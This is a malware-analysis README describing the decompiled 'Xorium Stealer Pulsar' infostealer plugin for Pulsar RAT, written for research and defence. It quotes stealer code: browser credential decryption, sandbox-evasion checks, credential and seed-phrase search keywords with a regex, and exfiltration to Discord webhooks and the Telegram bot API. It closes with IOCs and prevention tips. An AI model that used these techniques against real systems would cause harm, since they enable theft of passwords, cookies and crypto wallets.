# Xorium Stealer Pulsar - Malware Analysis for Research Purposes

> ⚠️ **LEGAL WARNING**: This repository contains decompiled malware. The content is provided **ONLY** for research, analysis, and cybersecurity education purposes. Using this code for illegal purposes is **STRICTLY PROHIBITED** and may result in criminal prosecution.

**[🇻🇳 Vietnamese Version](README.md)** | **[📊 Technical Report](REPORT.md)** | **[🛡️ Defensive Analysis](DEFENSIVE_ANALYSIS.md)**

---

## 📑 Documentation Index

| Document | Description | Audience |
|----------|-------------|----------|
| **README.md** | Overview, structure, targets (Vietnamese) | Everyone |
| **README_EN.md** (current) | English version of README | Everyone |
| **REPORT.md** | [Deep technical report 893 lines →](REPORT.md) | Malware Analysts |
| **DEFENSIVE_ANALYSIS.md** | [🛡️ Weaknesses + YARA/Sigma rules →](DEFENSIVE_ANALYSIS.md) | **Blue Team, SOC, IR** |

---

## 📋 Overview

**Xorium Stealer Pulsar** is a stealer plugin designed to integrate with **Pulsar RAT** (Remote Access Trojan) - a remote control framework. This plugin was developed by `@aesxor` and has the capability to harvest sensitive data from victim machines.

### Technical Information
- **Name**: Xorium Stealer Pulsar
- **Version**: 2.1.0 (Client), 2.0.0 (Server)
- **Language**: C# (.NET Framework 4.7.2)
- **Architecture**: Plugin-based for Pulsar RAT
- **Author**: @aesxor

---

## 🏗️ System Architecture

The project is divided into 2 main components:

```
Xorium Stealer Pulsar/
├── Pulsar.Plugin.Client/          # Client - Malware running on victim machine
│   └── Stealer.Client/
│       ├── Intelix/Targets/       # Data collection modules
│       └── Pulsar/Plugins/Client/ # Plugin entry point
│
└── Pulsar.Plugin.Server/          # Server - Control plugin for Pulsar RAT
    └── Stealer.Server/
        └── Pulsar/Plugins/Server/ # Server plugin entry point
```

### Operation Flow

1. **Server Plugin** (`Stealer.Server.dll`) is loaded into Pulsar RAT
2. Operator selects client and sends "Run Stealer" command
3. Server pushes `Stealer.Client.dll` to the victim machine
4. Client executes, collects data, and exfiltrates via:
   - Discord Webhook
   - Telegram Bot API
   - Directly back to Pulsar Server

---

## 🎯 Collection Targets

### 1. 🌐 Browsers
| Type | Supported Browsers |
|------|-------------------|
| **Chromium-based** | Chrome, Edge, Brave, Opera, Vivaldi, Yandex, Chromium |
| **Gecko-based** | Firefox, Waterfox, Pale Moon, SeaMonkey |

**Collected Data:**
- Browsing history
- Cookies (including session cookies)
- Saved passwords (decrypted from DPAPI)
- Credit cards (decrypted)
- AutoFill data
- Authentication tokens

### 2. 💬 Messaging Applications
- **Discord** - Tokens, user data
- **Telegram** - Session files, settings
- **Signal** - Configuration, local data
- **Skype** - Credentials, history
- **Viber** - Session data
- **Element (Riot.im)** - Configuration
- **ICQ** - User data
- **Pidgin** - Account settings
- **Tox** - Profile data
- **Outlook** - Email credentials
- **MicroSIP** - VoIP settings
- **Jabber** - IM credentials

### 3. 🎮 Gaming Platforms
| Game | Collected Data |
|------|---------------|
| **Steam** | Login credentials, session files, config |
| **Epic Games** | Account data, session |
| **Battle.net** | Credentials, game configs |
| **Riot Games** (Valorant, LoL) | Session tokens |
| **Roblox** | Cookies, login data |
| **Minecraft** | Session files, credentials |
| **Uplay (Ubisoft)** | Login data |
| **Xbox** | Account credentials |
| **Growtopia** | Save data |
| **Electronic Arts** | Session, credentials |

### 4. 🔐 VPN Clients
- NordVPN, ExpressVPN, ProtonVPN
- CyberGhost, Mullvad, PIA (Private Internet Access)
- OpenVPN, WireGuard, SoftEther
- Hamachi, RadminVPN, SurfShark
- IPVanish, HideMyName, Cisco AnyConnect
- Proxifier

### 5. 💰 Cryptocurrency Wallets

**Desktop Wallets:**
- Bitcoin Core, Electrum, Exodus
- Ethereum (keystore files)
- Atomic Wallet, Coinomi, Guarda
- Jaxx, Armory, Zcash
- Bytecoin, Dash Core
- Tari Universe

**Browser Extension Wallets:**
- MetaMask, Phantom, Trust Wallet
- Coinbase Wallet, Binance Wallet
- Ronin Wallet, Brave Wallet
- TronLink, Yoroi, Nami
- Math Wallet, XDEFI, Guarda
- Equal, BitAppWallet, iWallet
- Wombat, AtomicNFT, MewCx
- GuildWallet, Saturn, Ronin

### 6. 🖥️ System Information
- **SystemInfo** - OS version, hardware specs, username, hostname
- **ScreenShot** - Desktop screenshot capture
- **ProcessDump** - List of running processes
- **ProductKey** - Windows product key
- **WifiKey** - Saved WiFi passwords
- **InstalledPrograms** - List of installed software
- **InstalledBrowsers** - List of browsers

### 7. 🛠️ Other Applications

**Remote Access:**
- AnyDesk, TeamViewer, RDP
- RDCMan, Sunlogin, MobaXterm
- Xmanager, PuTTY

**FTP/SCP Clients:**
- FileZilla, WinSCP, CyberDuck
- CoreFTP, FTPNavigator, FTPRush
- FTPGetter, FTPCommander, TotalCommander

**Development/DevOps:**
- JetBrains IDEs (config, licenses)
- GitHub Desktop, Ngrok
- Navicat, No-IP, DynDNS
- OBS, TeamSpeak, PlayIt

---

## 🔧 Technical Mechanisms

### DPAPI Decryption (Data Protection API)
```csharp
// Extract Master Key from Local State
byte[] masterv10 = LocalState.MasterKeyV10(localstate);
byte[] masterv20 = LocalState.MasterKeyV20(localstate);
```

The malware uses DPAPI to decrypt browser encrypted data:
- Passwords stored in `Login Data` SQLite database
- Cookies in `Cookies` or `Network/Cookies`
- Credit cards in `Web Data`

### SQLite Database Parsing
Uses custom SQLite parser to read data from browser database files without locking them.

### Parallel Processing
```csharp
Task.WaitAll(Task.Run(() => Parallel.ForEach<ITarget>(
    Stealer.Targets, 
    target => target.Collect(zip, counter)
)));
```

Uses parallel processing to speed up data collection.

### Exfiltration

**Discord Webhook:**
```csharp
POST {webhookUrl}
Content-Type: multipart/form-data
- payload_json: Embed message with victim information
- file: ZIP archive containing stolen data
```

**Telegram Bot API:**
```csharp
POST https://api.telegram.org/bot{token}/sendDocument
- chat_id: {chatId}
- caption: Log metadata
- document: ZIP file
```

---

## 📊 Output Structure

Data is packaged into a ZIP file with the following structure:

```
{Username}_{ComputerName}_{YYYYMMDD}.zip
├── Browsers/
│   ├── Chrome/
│   │   ├── Passwords.txt
│   │   ├── Cookies.txt
│   │   ├── History.txt
│   │   └── CreditCards.txt
│   └── Firefox/
│       └── ...
├── Messengers/
│   ├── Discord/
│   ├── Telegram/
│   └── ...
├── Games/
│   ├── Steam/
│   ├── Epic/
│   └── ...
├── Wallets/
│   ├── Exodus/
│   ├── Electrum/
│   └── ...
├── VPN/
│   └── ...
├── Applications/
│   └── ...
├── System/
│   ├── SystemInfo.txt
│   ├── WiFiPasswords.txt
│   ├── InstalledPrograms.txt
│   └── Screenshot.png
└── counter.txt  # Summary statistics
```

---

## 🛡️ Anti-VM & Anti-Sandbox

The malware employs multiple techniques to detect and avoid running in virtualized environments (VM) or sandboxes:

### Anti-Analysis Techniques

| Technique | Description | Detection Condition |
|-----------|-------------|---------------------|
| **Processor Count Check** | Check number of CPU cores | `Environment.ProcessorCount <= 1` |
| **Debugger Detection** | Detect attached debugger | `Debugger.IsAttached` |
| **Memory Check** | Check total RAM | RAM < 2GB |
| **Drive Space Check** | Check C: drive capacity | < 50GB |
| **Cache Memory Check** | Check Win32_CacheMemory | No cache memory found |
| **CIM Memory Check** | Check CIM_Memory | No CIM memory found |
| **Process Name Check** | Check process name | Contains "sandbox" |
| **User/Machine Check** | Check username and hostname | Specific patterns |

### Detected User/Machine Patterns

```csharp
// Windows Defender Application Guard
username == "WDAGUtilityAccount"

// Common sandbox patterns
(username == "frank" && hostname.Contains("desktop"))
(username == "robert" && hostname.Contains("22h2"))
```

### Behavior When VM/Sandbox Detected

```csharp
public static void CheckOrExit()
{
    if (ProccessorCheck()) throw new Exception();
    if (CheckDebugger()) throw new Exception();
    if (CheckMemory()) throw new Exception();
    if (CheckDriveSpace()) throw new Exception();
    if (CheckUserConditions()) throw new Exception();
    if (CheckCache()) throw new Exception();
    if (CheckFileName()) throw new Exception();
    if (CheckCim()) throw new Exception();
}
```

When any condition is detected, the malware throws an exception and stops execution immediately.

---

## 🔐 Detailed Encryption & Decryption Mechanisms

### 1. DPAPI (Data Protection API)

Uses `CryptUnprotectData` from `Crypt32.dll` to decrypt Windows-protected data:

```csharp
[DllImport("crypt32.dll", SetLastError = true)]
public static extern bool CryptUnprotectData(
    ref DataBlob pDataIn,
    ref string szDataDescr,
    ref DataBlob pOptionalEntropy,
    IntPtr pvReserved,
    ref CryptprotectPromptstruct pPromptStruct,
    int dwFlags,
    ref DataBlob pDataOut);
```

### 2. AES-GCM-256 (Chromium v10/v20)

Decrypts Chrome/Edge passwords using AES-GCM with master key from Local State:

```csharp
// Encrypted data structure
[0-2]   : "v10" or "v20" (version prefix)
[3-14]  : 12-byte nonce/IV
[15-n]  : ciphertext
[n-16:n]: 16-byte authentication tag

// Decryption
byte[] decrypted = AesGcm256.Decrypt(masterKey, nonce, aad, ciphertext, tag);
```

### 3. ChaCha20-Poly1305

Supports ChaCha20-Poly1305 decryption for newer browsers:

```csharp
public static byte[] Decrypt(byte[] key32, byte[] iv12, byte[] ciphertext, byte[] tag, byte[] aad)
{
    // Key: 32 bytes
    // IV: 12 bytes  
    // Tag: 16 bytes (Poly1305 MAC)
    // Uses constant-time comparison to prevent timing attacks
}
```

### 4. TripleDES-CBC (Firefox/Gecko)

Decrypts Firefox passwords using 3DES-CBC with master key from key4.db/key3.db:

```csharp
// Parse ASN.1 structure
Asn1DerObject asn1Object = asn1Der.Parse(encryptedData);
byte[] iv = asn1Object.Objects[0].Objects[1].Objects[0].Data;
byte[] ciphertext = asn1Object.Objects[0].Objects[1].Objects[1].Data;

// Decrypt using TripleDES-CBC
string plaintext = TripleDes.DecryptStringDesCbc(masterKey, ciphertext, iv);
```

### 5. NSS Decryptor (Firefox Legacy)

Uses NSS (Network Security Services) library to decrypt legacy Firefox data:

```csharp
if (!NSSDecryptor.Initialize(profile))
    return;
string decrypted = NSSDecryptor.Decrypt(encryptedString);
```

---

## 🗄️ Custom SQLite Parser

The malware implements a **custom SQLite parser** instead of using standard libraries, allowing it to read databases without locking files:

### Parser Structure

```csharp
public class SqLite
{
    private readonly byte[] _fileBytes;
    private readonly ulong _pageSize;
    private readonly ulong _dbEncoding;
    private SqliteMasterEntry[] _masterTableEntries;
    private TableEntry[] _tableEntries;
    
    public SqLite(byte[] basedata)
    {
        _fileBytes = basedata;
        _pageSize = ConvertToULong(16, 2);    // Page size at offset 16
        _dbEncoding = ConvertToULong(56, 4);  // Encoding at offset 56
        ReadMasterTable(100L);                // Start at offset 100
    }
}
```

### Tables Read

| Database File | Tables | Data |
|--------------|--------|------|
| `Login Data` | `logins` | Username, password, URL |
| `Cookies` | `cookies` | Name, value, domain, path |
| `Web Data` | `autofill` | Form data, addresses |
| `Web Data` | `credit_cards` | Card number, expiry, name |
| `Web Data` | `token_service` | OAuth tokens |
| `Ya Passman Data` | `logins` | Yandex passwords |
| `Ya Credit Cards` | `records` | Yandex credit cards |

---

## 📁 File Grabber & Seed Phrase Hunter

The `Grabber` module searches for sensitive information files across the entire system:

### Search Keywords (35 keywords)

```csharp
private readonly string[] _keywords = new string[35]
{
    "password", "passwd", "pwd", "pass", "login", "user", "username",
    "account", "mail", "email", "secret", "key", "private", "public",
    "wallet", "mnemonic", "seed", "recovery", "phrase", "backup",
    "pin", "auth", "2fa", "token", "apikey", "api_key", "ssh",
    "cert", "certificate", "crypto", "btc", "eth", "usdt", "ltc", "xmr"
};
```

### Seed Phrase Regex Pattern

```csharp
// Find 12-24 word seed phrases (BIP-39)
private readonly Regex _seedRegex = new Regex(
    "^(?:\\s*\\b[a-z]{3,}\\b){12,24}\\s*$",
    RegexOptions.IgnoreCase | RegexOptions.Multiline | RegexOptions.Compiled);
```

### File Extensions Scanned

```csharp
private readonly string[] _seedExtensions = new string[9]
{
    ".seed", ".seedphrase", ".mnemonic", ".phrase", ".key",
    ".secret", ".txt", ".backup", ".wallet"
};
```

### Search Paths (19 locations)

- Desktop, Documents, Downloads
- OneDrive, Dropbox, iCloud Drive, Google Drive, YandexDisk, Mega
- Evernote, Standard Notes, Joplin
- Wallets, Keys, Crypto, Backup folders

### Size Limits

```csharp
private readonly long _sizeMinFile = 120;      // Min: 120 bytes
private readonly long _sizeLimitFile = 6144;   // Max per file: 6KB
private readonly long _sizeLimit = 5242880;    // Total: 5MB
```

---

## 🌐 Complete Browser List (84+ Browsers)

### Chromium-based (66 browsers)

| # | Browser | Path |
|---|---------|------|
| 1 | Google Chrome | `\Google\Chrome\User Data` |
| 2 | Microsoft Edge | `\Microsoft\Edge\User Data` |
| 3 | Brave | `\BraveSoftware\Brave-Browser\User Data` |
| 4 | Opera | `\Opera Software\Opera Stable` |
| 5 | Opera GX | `\Opera Software\Opera GX Stable` |
| 6 | Vivaldi | `\Vivaldi\User Data` |
| 7 | Yandex | `\Yandex\YandexBrowser\User Data` |
| 8 | CocCoc | `\CocCoc\Browser\User Data` |
| 9 | 360Chrome | `\360Chrome\Chrome\User Data` |
| 10 | 360Browser | `\360Browser\Browser\User Data` |
| 11 | CentBrowser | `\CentBrowser\User Data` |
| 12 | Comodo Dragon | `\Comodo\Dragon\User Data` |
| 13 | Epic Privacy | `\Epic Privacy Browser\User Data` |
| 14 | Avast Browser | `\AVAST Software\Browser\User Data` |
| 15 | CCleaner | `\CCleaner Browser\User Data` |
| 16 | Torch | `\Torch\User Data` |
| 17 | Uran | `\uCozMedia\Uran\User Data` |
| 18 | Iridium | `\Iridium\User Data` |
| 19 | Maxthon | `\Maxthon\User Data` |
| 20 | Slimjet | `\Slimjet\User Data` |
| ... | 46+ others | Various paths |

### Gecko-based (18 browsers)

| # | Browser | Path |
|---|---------|------|
| 1 | Firefox | `\Mozilla\Firefox\Profiles` |
| 2 | Waterfox | `\Waterfox\Profiles` |
| 3 | Thunderbird | `\Thunderbird\Profiles` |
| 4 | Pale Moon | `\Moonchild Productions\Pale Moon\Profiles` |
| 5 | SeaMonkey | `\Mozilla\SeaMonkey\Profiles` |
| 6 | K-Meleon | `\K-Meleon\Profiles` |
| 7 | IceDragon | `\Comodo\IceDragon\Profiles` |
| 8 | Cyberfox | `\8pecxstudios\Cyberfox\Profiles` |
| 9 | BlackHawk | `\NETGATE Technologies\BlackHawk\Profiles` |
| 10 | Mypal | `\Mypal\Profiles` |
| ... | 8+ others | Various paths |

---

## ⚙️ Windows APIs Used

### Process & Memory APIs

```csharp
[DllImport("psapi.dll")]
public static extern bool GetProcessMemoryInfo(...);  // Memory stats

[DllImport("psapi.dll")]
public static extern bool EnumProcesses(...);           // List processes

[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(...);           // Open process handle

[DllImport("kernel32.dll")]
public static extern bool TerminateProcess(...);        // Kill process
```

### DPAPI & Cryptography APIs

```csharp
[DllImport("crypt32.dll")]
public static extern bool CryptUnprotectData(...);      // Decrypt DPAPI

[DllImport("ncrypt.dll")]
public static extern int NCryptOpenStorageProvider(...);// CNG provider

[DllImport("ncrypt.dll")]
public static extern int NCryptDecrypt(...);            // CNG decrypt
```

### System Information APIs

```csharp
[DllImport("kernel32.dll")]
public static extern bool GetVolumeInformation(...);    // Volume info

[DllImport("kernel32.dll")]
public static extern bool GlobalMemoryStatusEx(...);    // Memory status

[DllImport("user32.dll")]
public static extern bool EnumDisplayDevices(...);      // Display info
```

---

## 📊 Report Structure (counter.txt)

The `counter.txt` file created in the ZIP archive has the following structure:

```
    ____      __       _______  __
   /  _/___  / /____  / /  _/ |/ /
   / // __ \/ __/ _ \/ // / |   / 
 _/ // / / / /_/  __/ // / /   |  
/___/_/ /_/\__/\___/_/___//_/|_|  
                                   
               InteliX by dead artis

[Keys]  [--3--]  [Chrome, Edge, Firefox]
       [Chrome Profile 1] MasterKey_v10: A1B2C3D4...
       [Edge Default] MasterKey_v20: E5F6G7H8...
       [Firefox default] MasterKey_NSS: I9J0K1L2...

[Browsers]  [--2--]  [Chrome, Firefox]
  - Profile 1
       [Cookies 156]
       [Passwords 23]
       [CreditCards 2]
       [AutoFill 45]
       [RestoreToken 3]

[Applications]  [--5--]  [Discord, FileZilla, Telegram, Steam, NordVPN]
     [Name Discord]
       - tokens.txt
       - Local Storage/leveldb/000003.log

[Games]  [--2--]  [Steam, Minecraft]
     [Name Steam]
       - config/loginusers.vdf
       - config/config.vdf

[Messangers]  [--3--]  [Telegram, Discord, Signal]
     [Name Telegram]
       - tdata/key_datas
       - tdata/settings

[Vpns]  [--1--]  [NordVPN]
     [Name NordVPN]
       - config.xml
       - user.config

[CryptoChromium]  [--2--]
       - MetaMask
       - Phantom

[CryptoDesktop]  [--3--]  [Exodus, Electrum, Atomic]
     [Exodus]
       - exodus.wallet/seed.seco
     [Electrum]
       - wallets/default_wallet
     [Atomic]
       - Local Storage/leveldb/000005.ldb

[FilesGrabber]  [--15--]
       - Desktop/backup.txt
       - Documents/wallet.key
       - Downloads/seed.txt
```

---

## 🛡️ Detection & Prevention

### IOCs (Indicators of Compromise)

**File Paths:**
- `%APPDATA%\pulsar_cl_conf.bin` - Config file storing webhook/token
- `%TEMP%\*.zip` - Temporary archive files

**Registry Keys:**
- Keys related to startup persistence

**Network Indicators:**
- Discord webhook URLs: `discord.com/api/webhooks/*`
- Telegram API: `api.telegram.org/bot*/sendDocument`

### Prevention Measures

1. **Use Password Manager** - Don't save passwords in browsers
2. **Disable AutoFill** - Turn off auto-fill features
3. **2FA/MFA** - Enable two-factor authentication for all accounts
4. **Endpoint Protection** - Use modern EDR/AV solutions
5. **Application Control** - Block execution of files from unknown sources
6. **Network Monitoring** - Monitor traffic to Discord/Telegram APIs

---

## 🔬 Reverse Engineering Analysis

### Analysis Tools
- **JetBrains dotPeek** / **dnSpy** - Decompile .NET assemblies
- **ILSpy** - Open-source .NET decompiler
- **Detect It Easy (DIE)** - Identify packer/compiler
- **PEStudio** - Static analysis of PE files

### Anti-Analysis Techniques
- **Costura.Fody** - Embed dependencies into main assembly
- **Obfuscation** - String encryption, symbol renaming
- **Compressed DLLs** - Compress libraries in resources

---

## 📚 References

### About DPAPI
- [Microsoft DPAPI Documentation](https://docs.microsoft.com/en-us/windows/win32/seccng/cng-dpapi)
- [Chrome Password Decryption](https://www.hackingarticles.in/forensic-investigation-of-stored-password-in-chrome/)

### About SQLite Forensics
- [Browser Forensics](https://www.sans.org/blog/browser-forensics/)
- [Chrome Forensics](https://forensicswiki.xyz/page/Google_Chrome)

### About Pulsar RAT
- Pulsar is a popular Remote Access Trojan framework in the cybercrime community

---

## ⚖️ Disclaimer

This repository is provided for **EDUCATION AND RESEARCH** purposes:

- ✅ Analyze malware to understand how it works
- ✅ Develop prevention and detection measures
- ✅ Train cybersecurity personnel
- ✅ Academic research on cybersecurity

**DO NOT:**
- ❌ Use to attack systems without authorization
- ❌ Distribute with malicious intent
- ❌ Use for illegal commercial purposes

---

## 👤 Analysis Author

This analysis was conducted by an independent malware analyst for cybersecurity research purposes.

**Analysis Date**: 2026-01-31  
**Analysis Version**: 1.0

---

## 📞 Contact

If you discover this malware in your system:
1. Disconnect from the internet immediately
2. Use antivirus tools to scan the entire system
3. Change all passwords from a different computer
4. Check crypto applications and move assets if necessary
5. Contact a cybersecurity expert

---

*"Know your enemy to protect yourself"*
